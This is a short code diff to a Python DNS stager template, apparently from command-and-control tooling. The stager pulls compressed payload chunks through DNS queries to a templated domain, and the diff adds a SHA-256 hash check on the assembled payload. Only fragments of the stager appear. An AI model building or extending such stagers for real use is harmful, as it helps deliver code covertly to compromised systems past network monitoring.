@@ -2,6 +2,7 @@
 # DNS stager template. Rendered by server-side generator.
 
 import base64
+import hashlib
 import random
 import re
 import socket
@@ -14,6 +15,7 @@ import zlib
 BASE_DOMAIN = '{{BASE_DOMAIN}}'
 CNAME_SUFFIX = '{{CNAME_SUFFIX}}'
 STAGER_NONCE = '{{STAGER_NONCE}}'
+PAYLOAD_HASH = '{{PAYLOAD_HASH}}'
 SFB_ARGS = {{SFB_ARGS}}
 
 COUNT_NAME = 'flat0.%s.count.%s' % (STAGER_NONCE, BASE_DOMAIN)
@@ -223,6 +225,12 @@ def main():
         return None
     data = b''.join(chunks[index] for index in range(1, count + 1))
     payload = zlib.decompress(data, 16 + zlib.MAX_WBITS)
+    payload_bytes = payload
+    if isinstance(payload_bytes, text_type):
+        payload_bytes = payload_bytes.encode('ascii')
+    digest = hashlib.sha256(payload_bytes).hexdigest()
+    if digest != PAYLOAD_HASH:
+        return None
     if not isinstance(payload, text_type):
         payload = payload.decode('ascii')
     return payload
